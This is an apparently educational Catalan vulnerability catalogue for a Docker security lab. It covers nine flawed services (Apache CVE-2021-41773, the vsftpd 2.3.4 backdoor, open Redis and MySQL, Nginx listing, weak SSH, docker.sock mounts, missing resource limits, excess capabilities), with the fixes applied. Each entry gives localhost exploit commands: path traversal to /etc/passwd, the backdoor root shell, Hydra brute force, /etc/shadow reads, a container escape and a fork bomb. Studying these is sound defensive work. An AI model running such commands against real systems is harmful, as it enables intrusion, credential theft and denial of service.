# VULNERABILITIES.md - Resum de Vulnerabilitats

**Autors:** Arnau Libori i Ayoub El Ballaoui

---

## Descripció

Aquest document recull el resum de totes les vulnerabilitats documentades al projecte DockerSecLab. El catàleg està organitzat en tres categories: vulnerabilitats de serveis exposats per xarxa, vulnerabilitats de configuració de serveis, i vulnerabilitats de configuració del contenidor/host.

---

## Índex General

| Num | Servei / Vulnerabilitat | Categoria | Risc | CVE / CWE |
|---|---|---|---|---|
| 1 | Apache 2.4.49 - Path Traversal + RCE | Xarxa | Crític | CVE-2021-41773 |
| 2 | vsftpd 2.3.4 - Backdoor | Xarxa | Crític | CVE-2011-2523 |
| 3 | Redis - Sense autenticació | Xarxa | Alt | CWE-287 |
| 4 | MySQL - Root sense contrasenya | Configuració | Crític | CWE-521 |
| 5 | Nginx - Directory listing | Configuració | Alt | CWE-548 |
| 6 | SSH - PermitRootLogin + pass feble | Configuració | Alt | CWE-521 |
| 7 | Muntatges perillosos (/, docker.sock) | Contenidor/Host | Crític | CWE-284 |
| 8 | Sense límits de recursos | Contenidor/Host | Alt | CWE-400 |
| 9 | Capabilities innecessàries | Contenidor/Host | Alt | CWE-250 |

---

## Categoria: Xarxa

### Vulnerabilitat 1 - Apache 2.4.49 CVE-2021-41773

**Ubicació:** `vulnerabilities/network/apache/`
**Documentació:** `documentation/vulnerabilities/1-apache-cve-2021-41773.md`
**Nivell de risc:** Crític | **CVE:** CVE-2021-41773 | **CVSS:** 9.8
**Ports:** Vulnerable: 9001 | Fixed: 9002

Una fallada en la normalització de paths a Apache 2.4.49 permet a un atacant fer path traversal fora del directori arrel del servidor. Si el mòdul CGI està actiu, la vulnerabilitat permet execució remota de codi (RCE) sense autenticació. Va ser explotada activament en la natura pocs dies després de la seva publicació.

**Prova d'explotació:**
```bash
curl --path-as-is http://localhost:9001/cgi-bin/.%2e/.%2e/.%2e/etc/passwd
```

**Solució aplicada:** Actualització a Apache 2.4.51+ des dels repositoris oficials i desactivació del mòdul CGI.

---

### Vulnerabilitat 2 - vsftpd 2.3.4 CVE-2011-2523

**Ubicació:** `vulnerabilities/network/ftp/`
**Documentació:** `documentation/vulnerabilities/2-ftp-vsftpd-backdoor.md`
**Nivell de risc:** Crític | **CVE:** CVE-2011-2523 | **CVSS:** 10.0
**Ports:** Vulnerable: 2121 | Fixed: 2122

El codi font de vsftpd 2.3.4 va ser compromès i es va introduir un backdoor intencionat. Quan un usuari envia un nom d'usuari que conté el caràcter ':)', el servidor obre una shell amb privilegis root al port 6200 sense cap autenticació addicional. Va romandre al repositori oficial durant varios mesos.

**Prova d'explotació:**
```bash
# Connexió FTP amb backdoor trigger
echo -e "USER hacker:)\nPASS hacker" | nc localhost 2121
# Connexió a la shell oberta
nc localhost 6200
```

**Solució aplicada:** Actualització a vsftpd 3.0.x instal·lat des dels repositoris oficials del sistema operatiu.

---

### Vulnerabilitat 3 - Redis sense autenticació

**Ubicació:** `vulnerabilities/network/redis/`
**Documentació:** `documentation/vulnerabilities/3-redis-sense-autenticacio.md`
**Nivell de risc:** Alt | **CWE:** CWE-287
**Ports:** Vulnerable: 6380 | Fixed: 6381 (només local)

Redis es configura per defecte per escoltar únicament a localhost. Quan un administrador canvia el binding a 0.0.0.0 sense afegir autenticació (requirepass), qualsevol atacant que arribi al port 6379 pot llegir, modificar o eliminar totes les dades emmagatzemades, incloent secrets, tokens i contrasenyes. Milers d'instàncies Redis han estat compromeses per aquest motiu.

**Prova d'explotació:**
```bash
redis-cli -p 6380 ping
redis-cli -p 6380 KEYS "*"
redis-cli -p 6380 GET secret_key
```

**Solució aplicada:** Binding restringit a 127.0.0.1, requirepass obligatori i desactivació de comandes perilloses (FLUSHALL, CONFIG, DEBUG).

---

## Categoria: Configuració de Serveis

### Vulnerabilitat 4 - MySQL root sense contrasenya

**Ubicació:** `vulnerabilities/configuration/mysql/`
**Documentació:** `documentation/vulnerabilities/4-mysql-credencials-febles.md`
**Nivell de risc:** Crític | **CWE:** CWE-521
**Ports:** Vulnerable: 3308 | Fixed: 3309 (només local)

MySQL configurat amb l'usuari root sense contrasenya i amb bind-address a 0.0.0.0 permet a qualsevol atacant que arribi al port 3306 connectar-se com a administrador sense autenticació i accedir, modificar o eliminar totes les bases de dades del servidor.

**Prova d'explotació:**
```bash
mysql -h 127.0.0.1 -P 3308 -u root
# Sense contrasenya: accés complet
SHOW DATABASES;
SELECT * FROM dades_sensibles.usuaris;
```

**Solució aplicada:** bind-address restringit a 127.0.0.1, contrasenya forta per a root, eliminació d'usuaris anònims i creació d'un usuari d'aplicació amb privilegis mínims.

---

### Vulnerabilitat 5 - Nginx directory listing i fitxers sensibles

**Ubicació:** `vulnerabilities/configuration/nginx/`
**Documentació:** `documentation/vulnerabilities/5-nginx-misconfiguracio.md`
**Nivell de risc:** Alt | **CWE:** CWE-548
**Ports:** Vulnerable: 9003 | Fixed: 9004

Nginx configurat amb autoindex on permet llistar el contingut de directoris. A més, si no es bloquegen explícitament les extensions de fitxers sensibles (.env, .conf, .sql, .bak), un atacant pot accedir directament a fitxers de configuració amb credencials, claus d'API o contrasenyes de bases de dades.

**Prova d'explotació:**
```bash
# Llistat de directoris
curl http://localhost:9003/

# Accés a fitxers sensibles
curl http://localhost:9003/.env
curl http://localhost:9003/config.conf
```

**Solució aplicada:** autoindex off, server_tokens off i bloqueig explícit de fitxers sensibles retornant 404.

---

### Vulnerabilitat 6 - SSH PermitRootLogin i contrasenya feble

**Ubicació:** `vulnerabilities/configuration/ssh/`
**Documentació:** `documentation/vulnerabilities/6-ssh-configuracio-insegura.md`
**Nivell de risc:** Alt | **CWE:** CWE-521
**Ports:** Vulnerable: 2223 | Fixed: 2224

OpenSSH configurat amb PermitRootLogin yes i PasswordAuthentication yes permet atacs de força bruta directament contra el compte root. Amb una contrasenya feble com root:root123, eines automatitzades com Hydra poden obtenir accés root al sistema en pocs minuts.

**Prova d'explotació:**
```bash
# Força bruta amb Hydra
hydra -l root -P /usr/share/wordlists/rockyou.txt \
  ssh://localhost:2223

# Accés directe un cop trobada la contrasenya
ssh root@localhost -p 2223
```

**Solució aplicada:** PermitRootLogin no, PasswordAuthentication no, només autenticació per clau pública i MaxAuthTries 3.

---

## Categoria: Configuració del Contenidor/Host

### Vulnerabilitat 7 - Muntatges perillosos

**Ubicació:** `vulnerabilities/container-host/dangerous-mounts/`
**Documentació:** `documentation/vulnerabilities/7-dangerous-mounts.md`
**Nivell de risc:** Crític | **CWE:** CWE-284
**Ports:** Vulnerable: 8093 | Fixed: 8094

Muntar l'arrel del sistema host (/) o el socket de Docker (/var/run/docker.sock) permet que un atacant que comprometi el contenidor obtingui control total sobre el host. Accedint al socket de Docker, es poden crear nous contenidors privilegiats que muntin el sistema de fitxers del host i escapar completament del contenidor.

**Prova d'explotació:**
```bash
# Llegir fitxers del host des del contenidor
docker exec vuln-dangerous-mounts cat /host/etc/shadow

# Escapament via docker.sock
docker exec vuln-dangerous-mounts \
  docker run -v /:/host --rm -it alpine chroot /host
```

**Solució aplicada:** Eliminar tots els muntatges del sistema host i muntar únicament el directori de dades de l'aplicació en mode de només lectura (:ro).

---

### Vulnerabilitat 8 - Sense límits de recursos

**Ubicació:** `vulnerabilities/container-host/no-resource-limits/`
**Documentació:** `documentation/vulnerabilities/8-no-resource-limits.md`
**Nivell de risc:** Alt | **CWE:** CWE-400
**Ports:** Vulnerable: 8089 | Fixed: 8090

Sense límits de CPU, memòria o I/O definits, un sol contenidor pot consumir tots els recursos del sistema host, causant una denegació de servei (DoS) que afecti tots els altres contenidors i el propi sistema operatiu.

**Prova d'explotació:**
```bash
# Fork bomb des del contenidor vulnerable
docker exec vuln-no-resource-limits bash -c ":(){ :|:& };:"

# Monitoritzar consum
docker stats
```

**Solució aplicada:** Definició de límits i reserves de CPU i memòria al docker-compose.yml amb el bloc deploy.resources (cpus: 0.50, memory: 256M).

---

### Vulnerabilitat 9 - Capabilities innecessàries

**Ubicació:** `vulnerabilities/container-host/unnecessary-capabilities/`
**Documentació:** `documentation/vulnerabilities/9-unnecessary-capabilities.md`
**Nivell de risc:** Alt | **CWE:** CWE-250
**Ports:** Vulnerable: 8091 | Fixed: 8092

Docker assigna per defecte un conjunt de capabilities als contenidors que en molts casos són excessives. CAP_NET_RAW permet sniffing de xarxa, CAP_SYS_ADMIN permet muntatges i moltes operacions privilegiades, i CAP_SETUID permet canviar d'usuari. Un atacant que comprometi el contenidor pot aprofitar-les per escalar privilegis.

**Prova d'explotació:**
```bash
# Sniffing de xarxa amb CAP_NET_RAW
docker exec vuln-unnecessary-capabilities \
  tcpdump -i eth0 -n

# Verificar capabilities actives
docker exec vuln-unnecessary-capabilities capsh --print
```

**Solució aplicada:** cap_drop: ALL per eliminar totes les capabilities i cap_add únicament amb NET_BIND_SERVICE, més security_opt: no-new-privileges:true.

---

## Resum per Nivell de Risc

### Crític
- Vulnerabilitat 1: Apache 2.4.49 CVE-2021-41773
- Vulnerabilitat 2: vsftpd 2.3.4 CVE-2011-2523
- Vulnerabilitat 4: MySQL root sense contrasenya
- Vulnerabilitat 7: Muntatges perillosos

### Alt
- Vulnerabilitat 3: Redis sense autenticació
- Vulnerabilitat 5: Nginx directory listing
- Vulnerabilitat 6: SSH PermitRootLogin
- Vulnerabilitat 8: Sense límits de recursos
- Vulnerabilitat 9: Capabilities innecessàries

---

## Eines Utilitzades per a la Verificació

| Eina | Funció |
|---|---|
| Trivy | Escaneig de vulnerabilitats en imatges Docker |
| nmap | Descobriment de ports i versions de serveis |
| Hydra | Proves de força bruta (SSH, FTP) |
| tcpdump | Captura i anàlisi de tràfic de xarxa |
| redis-cli | Proves d'accés a Redis sense autenticació |
| mysql-client | Proves d'accés a MySQL sense contrasenya |
| nc (netcat) | Detecció de banners i proves de connexió |
| curl | Proves de vulnerabilitats web (Apache, Nginx) |
| capsh | Verificació de capabilities actives |
| docker stats | Monitorització de consum de recursos |
| docker inspect | Inspecció de configuració de contenidors |

---

## Referències Generals

- [NVD - CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)
- [NVD - CVE-2011-2523](https://nvd.nist.gov/vuln/detail/CVE-2011-2523)
- [Docker Security Documentation](https://docs.docker.com/engine/security/)
- [CIS Docker Benchmark](https://www.cisecurity.org/benchmark/docker)
- [OWASP Docker Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Docker_Security_Cheat_Sheet.html)
- [Trivy - Vulnerability Scanner](https://github.com/aquasecurity/trivy)

---

**Ultima actualitzacio:** Abril 2026
**Versio:** 2.0.0
